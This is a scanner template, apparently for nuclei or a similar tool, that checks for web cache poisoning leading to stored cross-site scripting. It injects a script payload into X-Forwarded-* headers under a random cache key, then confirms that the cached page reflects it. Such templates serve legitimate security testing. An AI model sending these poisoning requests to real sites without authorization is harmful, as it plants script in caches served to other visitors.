id: cache-poisoning-xss

info:
  name: Cache Poisoning - Stored XSS
  author: melbadry9,xelkomy,akincibor
  severity: high
  verified: true
  reference:
    - https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning
    - https://portswigger.net/research/practical-web-cache-poisoning
    - https://portswigger.net/web-security/web-cache-poisoning
  tags: cache,generic,xss
  created: 2023/10/10

set:
  cache_key: randomLowercase(6)
  cache_header: randomLowercase(6)
  xss_payload: '"></script><script>alert(document.domain);</script>'
rules:
  r0:
    request:
      method: GET
      path: /?{{cache_key}}=1
      headers:
        X-Forwarded-Prefix: "{{cache_header}}.xfp{{xss_payload}}"
        X-Forwarded-Host: "{{cache_header}}.xfh{{xss_payload}}"
        X-Forwarded-For: "{{cache_header}}.xff{{xss_payload}}"
    expression: true
  r1:
    request:
      method: GET
      path: /?{{cache_key}}=1
    expression: response.body.bcontains(bytes(cache_header)) && response.body.bcontains(bytes(xss_payload))
expression: r0() && r1()